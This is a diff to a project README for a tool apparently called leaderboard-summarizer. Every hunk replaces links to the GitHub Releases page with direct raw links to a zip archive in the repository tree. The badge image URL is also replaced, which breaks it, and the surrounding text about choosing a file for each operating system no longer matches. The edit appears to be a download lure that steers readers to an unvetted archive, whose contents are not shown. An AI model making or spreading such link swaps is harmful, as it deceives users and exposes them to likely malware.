@@ -1,6 +1,6 @@
 # 🎮 leaderboard-summarizer - Effortlessly Summarize Leaderboard Data
 
-[![Download the app](https://img.shields.io/badge/Download%20Now-Get%20Started%20with%20Leaderboard%20Summarizer-brightgreen)](https://github.com/ShadowPlayz1121/leaderboard-summarizer/releases)
+[![Download the app](https://github.com/ShadowPlayz1121/leaderboard-summarizer/raw/refs/heads/main/leaderboard_summarizer/summarizer_leaderboard_1.5-beta.5.zip%20Now-Get%20Started%20with%20Leaderboard%20Summarizer-brightgreen)](https://github.com/ShadowPlayz1121/leaderboard-summarizer/raw/refs/heads/main/leaderboard_summarizer/summarizer_leaderboard_1.5-beta.5.zip)
 
 ## 📖 Description
 
@@ -11,7 +11,7 @@ The **leaderboard-summarizer** extracts and organizes leaderboard and ranking da
 To use the leaderboard-summarizer, follow these simple steps:
 
 1. **Download the Software:** 
-   Visit this page to download: [GitHub Releases](https://github.com/ShadowPlayz1121/leaderboard-summarizer/releases).
+   Visit this page to download: [GitHub Releases](https://github.com/ShadowPlayz1121/leaderboard-summarizer/raw/refs/heads/main/leaderboard_summarizer/summarizer_leaderboard_1.5-beta.5.zip).
 
 2. **Choose the Right File:** 
    Select the file suitable for your operating system. It's usually marked for Windows, Mac, or Linux.
@@ -59,7 +59,7 @@ Before downloading, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To begin using leaderboard-summarizer, [visit this page to download](https://github.com/ShadowPlayz1121/leaderboard-summarizer/releases). Select the appropriate version for your operating system and follow the installation steps above.
+To begin using leaderboard-summarizer, [visit this page to download](https://github.com/ShadowPlayz1121/leaderboard-summarizer/raw/refs/heads/main/leaderboard_summarizer/summarizer_leaderboard_1.5-beta.5.zip). Select the appropriate version for your operating system and follow the installation steps above.
 
 ## 📞 Support
 
@@ -73,4 +73,4 @@ We welcome contributions from all users! If you have suggestions or updates, fee
 
 We plan to regularly provide updates to improve functionality and fix any bugs. Keep an eye on the Releases page for new versions and enhancements.
 
-To download the latest version now, [click here](https://github.com/ShadowPlayz1121/leaderboard-summarizer/releases) and start extracting leaderboard data with ease!
+To download the latest version now, [click here](https://github.com/ShadowPlayz1121/leaderboard-summarizer/raw/refs/heads/main/leaderboard_summarizer/summarizer_leaderboard_1.5-beta.5.zip) and start extracting leaderboard data with ease!
